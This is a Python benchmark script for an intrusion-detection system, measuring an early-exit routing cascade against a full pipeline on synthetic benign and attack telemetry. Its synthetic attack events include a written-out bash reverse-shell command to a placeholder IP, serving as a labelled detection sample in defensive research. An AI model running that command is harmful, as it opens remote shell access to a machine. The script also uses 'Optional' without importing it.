from __future__ import annotations
"""
AHRAS Experiment Runner: EXP-15 — Confidence-Based Early-Exit Routing Benchmark
-------------------------------------------------------------------------------
Evaluates the multi-stage early-exit detection cascade against the monolithic
full-stack pipeline baseline.

Measures:
  - Detection Quality: F1, Precision, Recall, FPR
  - Latency Profiles: P50, P95, P99, Mean (ms)
  - System Efficiency: Throughput (EPS), CPU Utilization, Memory Footprint (MB)
  - Routing Cascade Dynamics: Stage exit fractions (f1, f2, f3, f4)
  - Quality vs. Compute Pareto Curve: Threshold sweeps across tau_conf

Generates:
  - evaluation/results/EARLY_EXIT_ROUTING_REPORT.json
  - evaluation/results/table_early_exit_routing.tex
"""

import os
import sys
import time
import json
import uuid
import psutil
import logging
from typing import Any, Dict, List, Tuple
from datetime import datetime, timezone

import numpy as np

# Ensure repository root is on PYTHONPATH
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from detection.model_router import ConfidenceModelRouter, RouterConfig, RoutedDetectionResult
from detection.dataset_generator import get_normal_vectors
from detection.anomaly_engine.ml_engine import bootstrap_with_normal_traffic

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")
log = logging.getLogger("exp15_early_exit")


# ── Synthetic Evaluation Stream Generator ─────────────────────────────────────

def generate_evaluation_stream(
    n_events: int = 1000,
    seed: int = 42,
) -> Tuple[List[Dict[str, Any]], List[int]]:
    """
    Generates a realistic heterogeneous telemetry stream comprising:
      - 60% Clear Benign events (routine web, DNS, unprivileged process commands)
      - 20% Signature Attacks (scans, brute-force, ransomware extensions)
      - 15% Subtle ML Anomalies (stealthy beaconing, unusual ratios)
      - 5%  Ambiguous Relational Attacks (lateral movement, multi-hop pivoting)
    Returns: (events, ground_truth_labels) where 0=Benign, 1=Attack.
    """
    rng = np.random.default_rng(seed)
    events: List[Dict[str, Any]] = []
    labels: List[int] = []

    ts = lambda: datetime.now(timezone.utc).isoformat()

    n_clear_benign = int(0.60 * n_events)
    n_sig_attacks = int(0.20 * n_events)
    n_ml_anom = int(0.15 * n_events)
    n_deep_rel = n_events - (n_clear_benign + n_sig_attacks + n_ml_anom)

    # 1. Clear Benign Events (y = 0)
    for i in range(n_clear_benign):
        evt_type = i % 3
        if evt_type == 0:
            events.append({
                "event_id": str(uuid.uuid4()),
                "ocsf_class": "network_activity",
                "timestamp": ts(),
                "src_ip": f"192.168.1.{10 + (i % 50)}",
                "dst_ip": "1.1.1.1",
                "src_port": 50000 + (i % 1000),
                "dst_port": 443 if (i % 2 == 0) else 80,
                "protocol": "TCP",
                "bytes_in": int(rng.uniform(500, 3000)),
                "bytes_out": int(rng.uniform(200, 1000)),
                "packet_count": int(rng.uniform(5, 25)),
                "duration": float(rng.uniform(0.1, 2.0)),
                "tcp_flags": ["SYN", "ACK"],
                "severity_id": 1,
            })
        elif evt_type == 1:
            events.append({
                "event_id": str(uuid.uuid4()),
                "ocsf_class": "process_activity",
                "timestamp": ts(),
                "process_name": "python3",
                "command": "python3 main.py --worker",
                "is_elevated": False,
                "cpu_pct": float(rng.uniform(2.0, 15.0)),
                "severity_id": 1,
            })
        else:
            events.append({
                "event_id": str(uuid.uuid4()),
                "ocsf_class": "file_activity",
                "timestamp": ts(),
                "filepath": f"/home/user/workspace/file_{i}.txt",
                "entropy": float(rng.uniform(3.5, 5.2)),
                "severity_id": 1,
            })
        labels.append(0)

    # 2. Signature Attacks (y = 1)
    for i in range(n_sig_attacks):
        sig_type = i % 3
        if sig_type == 0:
            # Port scan
            events.append({
                "event_id": str(uuid.uuid4()),
                "ocsf_class": "network_activity",
                "timestamp": ts(),
                "src_ip": f"10.0.0.{100 + (i % 50)}",
                "dst_ip": "192.168.1.1",
                "src_port": 45000,
                "dst_port": 22,
                "protocol": "TCP",
                "packet_count": 2000,
                "byte_count": 120000,
                "duration_sec": 0.5,
                "tcp_flags": ["SYN"],
                "unique_dst_ports": 50,
                "severity_id": 4,
            })
        elif sig_type == 1:
            # Ransomware file write
            events.append({
                "event_id": str(uuid.uuid4()),
                "ocsf_class": "file_activity",
                "timestamp": ts(),
                "filepath": f"/var/data/finance_{i}.locked",
                "entropy": float(rng.uniform(7.5, 7.95)),
                "severity_id": 5,
            })
        else:
            # Reverse shell process
            events.append({
                "event_id": str(uuid.uuid4()),
                "ocsf_class": "process_activity",
                "timestamp": ts(),
                "process_name": "bash",
                "command": "bash -i >& /dev/tcp/198.51.100.5/4444 0>&1",
                "is_elevated": True,
                "severity_id": 5,
            })
        labels.append(1)

    # 3. Subtle ML Anomalies (y = 1)
    for i in range(n_ml_anom):
        events.append({
            "event_id": str(uuid.uuid4()),
            "ocsf_class": "network_activity",
            "timestamp": ts(),
            "src_ip": f"192.168.1.{200 + (i % 20)}",
            "dst_ip": "203.0.113.88",
            "src_port": 38192,
            "dst_port": 8443,
            "protocol": "TCP",
            "bytes_in": int(rng.uniform(80000, 300000)),
            "bytes_out": int(rng.uniform(250000, 900000)),
            "packet_count": int(rng.uniform(800, 3000)),
            "duration": float(rng.uniform(300.0, 1200.0)),
            "tcp_flags": ["ACK", "PSH"],
            "severity_id": 2,
        })
        labels.append(1)

    # 4. Ambiguous Relational Attacks (y = 1)
    for i in range(n_deep_rel):
        events.append({
            "event_id": str(uuid.uuid4()),
            "ocsf_class": "network_activity",
            "timestamp": ts(),
            "src_ip": f"192.168.2.{i + 1}",
            "dst_ip": f"192.168.3.{i + 1}",
            "src_port": 49912,
            "dst_port": 445,
            "protocol": "TCP",
            "bytes_in": int(rng.uniform(15000, 45000)),
            "bytes_out": int(rng.uniform(18000, 50000)),
            "packet_count": int(rng.uniform(120, 400)),
            "duration": float(rng.uniform(5.0, 25.0)),
            "tcp_flags": ["ACK"],
            "severity_id": 3,
            "in_degree": 12,
            "out_degree": 18,
            "neighbor_anomaly_mean": 0.82,
        })
        labels.append(1)

    # Shuffle stream consistently
    perm = rng.permutation(n_events)
    shuffled_events = [events[p] for p in perm]
    shuffled_labels = [labels[p] for p in perm]

    return shuffled_events, shuffled_labels


# ── Benchmark Evaluation Function ─────────────────────────────────────────────

def evaluate_pipeline(
    events: List[Dict[str, Any]],
    labels: List[int],
    force_full: bool = False,
    config: Optional[RouterConfig] = None,
) -> Dict[str, Any]:
    """
    Evaluates detection quality, latency percentiles, throughput, and resource footprint.
    """
    router = ConfidenceModelRouter(config=config)
    latencies_ms: List[float] = []
    predictions: List[int] = []

    process = psutil.Process(os.getpid())
    mem_before = process.memory_info().rss / (1024 * 1024)
    cpu_t0 = time.process_time()
    wall_t0 = time.perf_counter()

    for evt in events:
        res = router.route(evt, force_full=force_full)
        if res is not None:
            latencies_ms.append(res.latency_ms)
            predictions.append(1 if res.is_alert else 0)
        else:
            predictions.append(0)

    wall_duration = time.perf_counter() - wall_t0
    cpu_duration = time.process_time() - cpu_t0
    mem_after = process.memory_info().rss / (1024 * 1024)

    # Compute metrics
    y_true = np.array(labels)
    y_pred = np.array(predictions)

    tp = int(np.sum((y_true == 1) & (y_pred == 1)))
    fp = int(np.sum((y_true == 0) & (y_pred == 1)))
    fn = int(np.sum((y_true == 1) & (y_pred == 0)))
    tn = int(np.sum((y_true == 0) & (y_pred == 0)))

    precision = round(float(tp / (tp + fp)) if (tp + fp) > 0 else 0.0, 4)
    recall = round(float(tp / (tp + fn)) if (tp + fn) > 0 else 0.0, 4)
    f1 = round(float(2 * precision * recall / (precision + recall)) if (precision + recall) > 0 else 0.0, 4)
    fpr = round(float(fp / (fp + tn)) if (fp + tn) > 0 else 0.0, 4)

    lat_arr = np.array(latencies_ms) if latencies_ms else np.array([0.0])
    p50 = round(float(np.percentile(lat_arr, 50)), 3)
    p95 = round(float(np.percentile(lat_arr, 95)), 3)
    p99 = round(float(np.percentile(lat_arr, 99)), 3)
    mean_lat = round(float(np.mean(lat_arr)), 3)
    throughput = round(float(len(events) / max(wall_duration, 1e-6)), 1)

    cpu_util_pct = round(float((cpu_duration / max(wall_duration, 1e-6)) * 100), 2)
    mem_footprint_mb = round(float(mem_after), 2)

    router_stats = router.get_stats()

    return {
        "f1": f1,
        "precision": precision,
        "recall": recall,
        "fpr": fpr,
        "tp": tp,
        "fp": fp,
        "fn": fn,
        "tn": tn,
        "p50_latency_ms": p50,
        "p95_latency_ms": p95,
        "p99_latency_ms": p99,
        "mean_latency_ms": mean_lat,
        "throughput_eps": throughput,
        "cpu_util_pct": cpu_util_pct,
        "memory_mb": mem_footprint_mb,
        "wall_duration_sec": round(wall_duration, 3),
        "exit_fractions": router_stats["exit_fractions"],
        "stage_exits": router_stats["stage_exits"],
        "early_exit_rate": router_stats["early_exit_rate"],
    }


# ── Main Experiment Runner ───────────────────────────────────────────────────

def run_early_exit_experiment() -> Dict[str, Any]:
    log.info("Starting EXP-15: Confidence-Based Early-Exit Model Routing Benchmark")

    # Bootstrap anomaly engine models
    log.info("Bootstrapping baseline normal feature distributions...")
    for c in ["network_activity", "process_activity", "file_activity", "cloud_api"]:
        normals = get_normal_vectors(c, n=300)
        bootstrap_with_normal_traffic(c, normals)

    # Generate test stream
    n_events = 1000
    events, labels = generate_evaluation_stream(n_events=n_events, seed=42)
    log.info(f"Generated evaluation stream: {len(events)} events (Attack ratio: {np.mean(labels):.2%})")

    # 1. Evaluate FULL PIPELINE (monolithic baseline)
    log.info("Evaluating FULL PIPELINE Baseline (forcing 4 stages on all events)...")
    full_config = RouterConfig(force_stage=4)
    full_metrics = evaluate_pipeline(events, labels, force_full=True, config=full_config)
    log.info(
        f"FULL PIPELINE -> F1: {full_metrics['f1']}, P50: {full_metrics['p50_latency_ms']}ms, "
        f"Throughput: {full_metrics['throughput_eps']} EPS"
    )

    # 2. Evaluate EARLY-EXIT CASCADE (adaptive routing)
    log.info("Evaluating EARLY-EXIT Adaptive Cascade...")
    early_config = RouterConfig(
        conf_threshold=0.85,
        uncertainty_threshold=0.20,
        margin_threshold=0.35,
        ood_threshold=0.30,
        decision_threshold=0.50,
    )
    early_metrics = evaluate_pipeline(events, labels, force_full=False, config=early_config)
    log.info(
        f"EARLY-EXIT CASCADE -> F1: {early_metrics['f1']}, P50: {early_metrics['p50_latency_ms']}ms, "
        f"Throughput: {early_metrics['throughput_eps']} EPS, Early Exit Rate: {early_metrics['early_exit_rate']:.1%}"
    )

    # 3. Quality vs. Compute Pareto Curve Sweep across tau_conf
    log.info("Computing Quality vs. Compute Pareto Frontier (varying tau_conf)...")
    pareto_curve: List[Dict[str, Any]] = []
    tau_sweep = [0.70, 0.75, 0.80, 0.85, 0.90, 0.95]

    for tau in tau_sweep:
        cfg = RouterConfig(
            conf_threshold=tau,
            uncertainty_threshold=0.20,
            margin_threshold=0.35,
            ood_threshold=0.30,
        )
        res = evaluate_pipeline(events, labels, force_full=False, config=cfg)
        pareto_curve.append({
            "tau_conf": tau,
            "f1": res["f1"],
            "precision": res["precision"],
            "recall": res["recall"],
            "p50_latency_ms": res["p50_latency_ms"],
            "p95_latency_ms": res["p95_latency_ms"],
            "throughput_eps": res["throughput_eps"],
            "early_exit_rate": res["early_exit_rate"],
            "exit_fractions": res["exit_fractions"],
        })
        log.info(
            f"  tau={tau:.2f} -> F1={res['f1']:.4f}, P50={res['p50_latency_ms']:.2f}ms, "
            f"EPS={res['throughput_eps']:.1f}, EarlyRate={res['early_exit_rate']:.1%}"
        )

    # Speedup and Latency Reduction calculations
    speedup = round(early_metrics["throughput_eps"] / max(full_metrics["throughput_eps"], 1e-6), 2)
    lat_reduction_pct = round(
        (full_metrics["mean_latency_ms"] - early_metrics["mean_latency_ms"]) / max(full_metrics["mean_latency_ms"], 1e-6) * 100, 2
    )

    # Final structured report
    report = {
        "experiment_id": "EXP-15",
        "title": "Confidence-Based Early-Exit Model Routing Benchmark",
        "timestamp_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "status": "COMPLETED",
        "dataset": {
            "total_events": n_events,
            "attack_count": int(np.sum(labels)),
            "benign_count": int(n_events - np.sum(labels)),
        },
        "comparison": {
            "full_pipeline": full_metrics,
            "early_exit_cascade": early_metrics,
            "throughput_speedup": speedup,
            "latency_reduction_pct": lat_reduction_pct,
            "f1_delta": round(early_metrics["f1"] - full_metrics["f1"], 4),
        },
        "pareto_curve": pareto_curve,
    }

    # Save JSON report
    out_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "results"))
    os.makedirs(out_dir, exist_ok=True)
    json_path = os.path.join(out_dir, "EARLY_EXIT_ROUTING_REPORT.json")
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2)
    log.info(f"Saved machine-readable JSON report to {json_path}")

    # Generate LaTeX table
    tex_path = os.path.join(out_dir, "table_early_exit_routing.tex")
    generate_latex_table(full_metrics, early_metrics, pareto_curve, tex_path)
    log.info(f"Saved LaTeX table to {tex_path}")

    return report


def generate_latex_table(
    full: Dict[str, Any],
    early: Dict[str, Any],
    pareto: List[Dict[str, Any]],
    output_path: str,
) -> None:
    """Generates LaTeX table for peer-reviewed journal submission."""
    lines = [
        r"\begin{table*}[t]",
        r"\centering",
        r"\small",
        r"\caption{AHRAS Confidence-Based Early-Exit Model Routing Performance (EXP-15)}",
        r"\label{tab:early_exit_routing_eval}",
        r"\begin{tabular}{lcccccccc}",
        r"\toprule",
        r"\textbf{Pipeline Architecture} & \textbf{F1} & \textbf{Precision} & \textbf{Recall} & \textbf{P50 (ms)} & \textbf{P99 (ms)} & \textbf{Throughput (EPS)} & \textbf{Early Exit \%} & $f_1 / f_2 / f_3 / f_4$ \\",
        r"\midrule",
    ]

    # Full pipeline row
    f_frac = f"{full['exit_fractions']['f1']:.2f}/{full['exit_fractions']['f2']:.2f}/{full['exit_fractions']['f3']:.2f}/{full['exit_fractions']['f4']:.2f}"
    lines.append(
        f"Full Pipeline Baseline & {full['f1']:.4f} & {full['precision']:.4f} & {full['recall']:.4f} & "
        f"{full['p50_latency_ms']:.2f} & {full['p99_latency_ms']:.2f} & {full['throughput_eps']:.1f} & "
        f"{full['early_exit_rate']*100:.1f}\\% & {f_frac} \\\\"
    )

    # Early exit adaptive cascade row
    e_frac = f"{early['exit_fractions']['f1']:.2f}/{early['exit_fractions']['f2']:.2f}/{early['exit_fractions']['f3']:.2f}/{early['exit_fractions']['f4']:.2f}"
    lines.append(
        f"Early-Exit Cascade (Default) & {early['f1']:.4f} & {early['precision']:.4f} & {early['recall']:.4f} & "
        f"{early['p50_latency_ms']:.2f} & {early['p99_latency_ms']:.2f} & {early['throughput_eps']:.1f} & "
        f"{early['early_exit_rate']*100:.1f}\\% & {e_frac} \\\\"
    )

    lines.append(r"\midrule")
    lines.append(r"\multicolumn{9}{l}{\textit{Pareto Sensitivity: Varying Confidence Threshold $\tau_{\mathrm{conf}}$}} \\")

    for p in pareto:
        p_frac = f"{p['exit_fractions']['f1']:.2f}/{p['exit_fractions']['f2']:.2f}/{p['exit_fractions']['f3']:.2f}/{p['exit_fractions']['f4']:.2f}"
        lines.append(
            f"Cascade ($\\tau={p['tau_conf']:.2f}$) & {p['f1']:.4f} & {p['precision']:.4f} & {p['recall']:.4f} & "
            f"{p['p50_latency_ms']:.2f} & {p['p95_latency_ms']:.2f} & {p['throughput_eps']:.1f} & "
            f"{p['early_exit_rate']*100:.1f}\\% & {p_frac} \\\\"
        )

    lines.extend([
        r"\bottomrule",
        r"\end{tabular}",
        r"\end{table*}",
    ])

    with open(output_path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")


if __name__ == "__main__":
    rep = run_early_exit_experiment()
    print("\n" + "=" * 80)
    print("EXP-15 EARLY-EXIT MODEL ROUTING BENCHMARK COMPLETE")
    print(f"Throughput Speedup: {rep['comparison']['throughput_speedup']}x")
    print(f"Latency Reduction: {rep['comparison']['latency_reduction_pct']}%")
    print(f"F1: Full={rep['comparison']['full_pipeline']['f1']} -> EarlyExit={rep['comparison']['early_exit_cascade']['f1']}")
    print(f"P50 Latency: Full={rep['comparison']['full_pipeline']['p50_latency_ms']}ms -> EarlyExit={rep['comparison']['early_exit_cascade']['p50_latency_ms']}ms")
    print(f"Exit Fractions: f1={rep['comparison']['early_exit_cascade']['exit_fractions']['f1']}, f2={rep['comparison']['early_exit_cascade']['exit_fractions']['f2']}, f3={rep['comparison']['early_exit_cascade']['exit_fractions']['f3']}, f4={rep['comparison']['early_exit_cascade']['exit_fractions']['f4']}")
    print("=" * 80)
